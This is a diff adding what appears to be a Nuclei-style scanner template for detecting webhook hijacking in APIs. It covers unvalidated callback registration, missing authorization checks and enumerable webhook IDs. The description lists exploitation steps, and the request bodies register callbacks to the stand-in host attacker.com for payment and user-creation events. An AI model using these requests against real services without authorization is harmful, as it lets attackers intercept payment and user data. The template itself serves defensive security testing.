@@ -1,0 +1,78 @@
+id: custom-2026-api-004
+info:
+  name: Webhook Callback Hijacking - Event Interception
+  author: SecurityTeam
+  severity: high
+  description: |
+    Detects webhook endpoints that can be hijacked to intercept events:
+    1. Webhook URL registration without validation
+    2. No signature verification on callbacks
+    3. Predictable webhook IDs (sequential, incremental)
+    4. Webhook events contain sensitive data
+    
+    Exploitation:
+    - Register attacker-controlled webhook URL
+    - Receive sensitive event data (payment info, user data)
+    - Modify webhook to process malicious payloads
+    - Subscribe to other users' events via ID enumeration
+  
+  reference:
+    - https://owasp.org/www-community/attacks/Webhook_Hijacking
+
+requests:
+  - method: POST
+    path: /api/v1/webhooks/register
+    headers:
+      Content-Type: "application/json"
+      Authorization: "Bearer {{auth_token}}"
+    body: |
+      {
+        "url": "https://attacker.com/webhook/callback",
+        "events": ["payment.completed", "user.created"]
+      }
+    
+    extractors:
+      - type: json
+        internal: true
+        name: webhook_id
+        json:
+          - '.webhook_id'
+
+  - method: GET
+    path: /api/v1/webhooks/{{webhook_id}}
+    headers:
+      Authorization: "Bearer {{different_user_token}}"
+    
+    matchers:
+      - type: dsl
+        expressions:
+          # Webhook accessible without authorization check
+          - 'status == 200 AND contains(body, "url")'
+        condition: all
+
+  - method: POST
+    path: /api/v1/webhooks
+    headers:
+      Content-Type: "application/json"
+    body: |
+      {
+        "url": "https://attacker.com/hook"
+      }
+    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"id"'
+        
+      - type: dsl
+        expressions:
+          # Webhook ID is sequential (enumerable)
+          - 'tonumber(webhook_id) < 100000'
+        condition: all
+
+tags:
+  - api
+  - webhook
+  - event-hijacking
+  - information-disclosure
